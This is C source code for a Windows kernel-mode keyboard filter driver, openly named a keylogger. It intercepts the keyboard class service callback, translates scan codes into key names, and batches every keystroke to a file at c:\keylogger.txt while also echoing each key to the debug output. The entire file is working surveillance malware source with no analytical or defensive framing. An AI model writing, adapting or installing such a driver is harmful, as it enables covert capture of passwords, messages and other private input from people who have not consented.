#include "ntddk.h"
#include "wdf.h"
#include <kbdmou.h>
#include <ntddkbd.h>
#include <ntdd8042.h>
#include <ntstrsafe.h>

#define KEYVALUESCOUNT 89
#define BUFFERSIZE 10

typedef struct _DEVICE_EXTENSION {
    CONNECT_DATA UpperConnectData;
    WDFWORKITEM  workItem;
    WDFSPINLOCK spinLock;
    KEYBOARD_INPUT_DATA buffer[BUFFERSIZE];
    USHORT buferIndex;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;

WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(DEVICE_EXTENSION, GetDeviceExtension)

HANDLE fileHandle;

char* keyValues[KEYVALUESCOUNT] = {
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "Backspace",
    "Tab",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "[",
    "]",
    "Enter",
    "Left Ctrl",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    ";",
    "'",
    "`",
    "Left Shift",
    "\\",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    "/",
    "Right Shift",
    "Kpd *",
    "Left Alt",
    "Space",
    "CapsLock",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NumberLock",
    "ScrollLock",
    "Kpd 7",
    "Kpd 8",
    "Kpd 9",
    "Kpd -",
    "Kpd 4",
    "Kpd 5",
    "Kpd 6",
    "Kpd +",
    "Kpd 1",
    "Kpd 2",
    "Kpd 3",
    "Kpd 0",
    "Kpd .",
    "",
    "",
    "",
    "",
    "F11",
    "F12"
};

char* flagValues[4] = {
    "Pressed",
    "Released",
    "E0",
    "E1"
};

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD keyloggerDeviceAdd;
EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL keyloggerEvtIoInternalDeviceControl;

NTSTATUS openFile();
VOID keyloggerServiceCallback(
    _In_    PDEVICE_OBJECT          DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA    InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA    InputDataEnd,
    _Inout_ PULONG                  InputDataConsumed
);
VOID keyloggerWorkItem(WDFWORKITEM workItem);

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject,
    _In_ PUNICODE_STRING    RegistryPath
)
{
    WDF_DRIVER_CONFIG config;
    NTSTATUS status;

    DbgPrint("Keylogger DriverEntry\n");

    WDF_DRIVER_CONFIG_INIT(&config, keyloggerDeviceAdd);

    status = WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("WdfDriverCreate failed 0x%x\n", status);
    }
    return status;
}

NTSTATUS keyloggerDeviceAdd(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    NTSTATUS status;
    WDFDEVICE device;
    WDF_IO_QUEUE_CONFIG queueConfig;
    WDF_OBJECT_ATTRIBUTES attributes;
    WDF_WORKITEM_CONFIG workItemConfig;

    UNREFERENCED_PARAMETER(Driver);

    DbgPrint("Keylogger DeviceAdd\n");

    WdfFdoInitSetFilter(DeviceInit);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&attributes, DEVICE_EXTENSION);

    status = WdfDeviceCreate(&DeviceInit, &attributes, &device);
    if (!NT_SUCCESS(status)) {
        DbgPrint("WdfDeviceCreate failed 0x%x\n", status);
        return status;
    }

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig, WdfIoQueueDispatchParallel);
    queueConfig.EvtIoInternalDeviceControl = keyloggerEvtIoInternalDeviceControl;

    status = WdfIoQueueCreate(device, &queueConfig, WDF_NO_OBJECT_ATTRIBUTES, WDF_NO_HANDLE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Queue create failed 0x%x\n", status);
        return status;
    }

    PDEVICE_EXTENSION devExt = GetDeviceExtension(device);

    WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
    attributes.ParentObject = device;

    status = WdfSpinLockCreate(&attributes, &devExt->spinLock);
    if (!NT_SUCCESS(status)) {
        DbgPrint("WdfSpinLockCreate failed 0x%x\n", status);
        return status;
    }

    WDF_WORKITEM_CONFIG_INIT(&workItemConfig, keyloggerWorkItem);
    WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
    attributes.ParentObject = device;

    status = WdfWorkItemCreate(&workItemConfig, &attributes, &devExt->workItem);
    if (!NT_SUCCESS(status)) {
        DbgPrint("WdfWorkItemCreate failed 0x%x\n", status);
        return status;
    }

    openFile();

    return status;
}


VOID keyloggerEvtIoInternalDeviceControl(
    _In_ WDFQUEUE   Queue,
    _In_ WDFREQUEST Request,
    _In_ size_t     OutputBufferLength,
    _In_ size_t     InputBufferLength,
    _In_ ULONG      IoControlCode
)
{
    PDEVICE_EXTENSION               devExt;
    PCONNECT_DATA                   connectData = NULL;
    NTSTATUS                        status = STATUS_SUCCESS;
    size_t                          length;
    WDFDEVICE                       hDevice;
    BOOLEAN                         ret = TRUE;
    WDF_REQUEST_SEND_OPTIONS        options;


    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);

    hDevice = WdfIoQueueGetDevice(Queue);
    devExt = GetDeviceExtension(hDevice);


    if (IoControlCode != IOCTL_INTERNAL_KEYBOARD_CONNECT) {
        WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
        ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

        if (!ret) {
            status = WdfRequestGetStatus(Request);
            DbgPrint("WdfRequestSend failed: 0x%x\n", status);
            WdfRequestComplete(Request, status);
        }
        return;
    }

    if (devExt->UpperConnectData.ClassService != NULL) {
        WdfRequestComplete(Request, STATUS_SHARING_VIOLATION);
        return;
    }

    status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), (PVOID*)&connectData, &length);

    if (!NT_SUCCESS(status)) {
        DbgPrint("WdfRequestRetrieveInputBuffer failed %x\n", status);
        WdfRequestComplete(Request, status);
        return;
    }

    devExt->UpperConnectData = *connectData;
    devExt->buferIndex = 0;

    connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

    #pragma warning(disable:4152)

    connectData->ClassService = keyloggerServiceCallback;

    #pragma warning(default:4152)

    
    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
    ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

    if (!ret) {
        status = WdfRequestGetStatus(Request);
        DbgPrint("WdfRequestSend failed 0x%x\n", status);
        WdfRequestComplete(Request, status);
    }

}


NTSTATUS openFile() {

    IO_STATUS_BLOCK		ioStatusBlock;
    OBJECT_ATTRIBUTES	fileObjectAttributes;
    NTSTATUS			status = STATUS_SUCCESS;
    UNICODE_STRING		filename;

    RtlInitUnicodeString(&filename, L"\\DosDevices\\c:\\keylogger.txt");

    InitializeObjectAttributes(
        &fileObjectAttributes,
        &filename,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL);

    status = ZwCreateFile(
        &fileHandle,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &fileObjectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    return status;
}


VOID keyloggerServiceCallback(
    _In_    PDEVICE_OBJECT          DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA    InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA    InputDataEnd,
    _Inout_ PULONG                  InputDataConsumed
)
{


    WDFDEVICE hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
    PDEVICE_EXTENSION devExt = GetDeviceExtension(hDevice);

    PKEYBOARD_INPUT_DATA current;

    for (current = InputDataStart; current < InputDataEnd; current++) {
        if (current->MakeCode > 0 && current->MakeCode < KEYVALUESCOUNT) {
            DbgPrint("%s\t%s\n", keyValues[current->MakeCode - 1], flagValues[current->Flags]);
        }
        else {
            DbgPrint("Code %d\t%s\n", current->MakeCode, flagValues[current->Flags]);
        }
        if (devExt->buferIndex < BUFFERSIZE) {
            WdfSpinLockAcquire(devExt->spinLock);

            devExt->buffer[devExt->buferIndex++] = *current;

            WdfSpinLockRelease(devExt->spinLock);
        }
        else {
            WdfWorkItemEnqueue(devExt->workItem);
        }
    }

    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)devExt->UpperConnectData.ClassService)(
        devExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed
        );
}

VOID keyloggerWorkItem(WDFWORKITEM WorkItem) {
    WDFDEVICE device = WdfWorkItemGetParentObject(WorkItem);
    PDEVICE_EXTENSION devExt = GetDeviceExtension(device);

    KEYBOARD_INPUT_DATA temp[BUFFERSIZE];

    WdfSpinLockAcquire(devExt->spinLock);

    for (int i = 0; i < BUFFERSIZE; i++) {
        temp[i] = devExt->buffer[i];
    }

    devExt->buferIndex = 0;

    WdfSpinLockRelease(devExt->spinLock);

    char textBuffer[BUFFERSIZE * 24];
    char lineBuffer[24];

    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;
    size_t length;

    textBuffer[0] = '\0';


    for (int i = 0; i < BUFFERSIZE; i++) {
        if (temp[i].MakeCode > 0 && temp[i].MakeCode < KEYVALUESCOUNT) {
            status = RtlStringCbPrintfA(lineBuffer, sizeof(lineBuffer), "%s\t%s\n", keyValues[temp[i].MakeCode - 1], flagValues[temp[i].Flags]);
        }
        else {
            status = RtlStringCbPrintfA(lineBuffer, sizeof(lineBuffer), "Code %d\t%s\n", temp[i].MakeCode, flagValues[temp[i].Flags]);
        }

        if (NT_SUCCESS(status)) {
            RtlStringCbCatA(textBuffer, sizeof(textBuffer), lineBuffer);
        }
    }

    status = RtlStringCbLengthA(textBuffer, sizeof(textBuffer), &length);
    if (NT_SUCCESS(status)) {
        status = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, textBuffer, (ULONG)length, NULL, NULL);
    }

}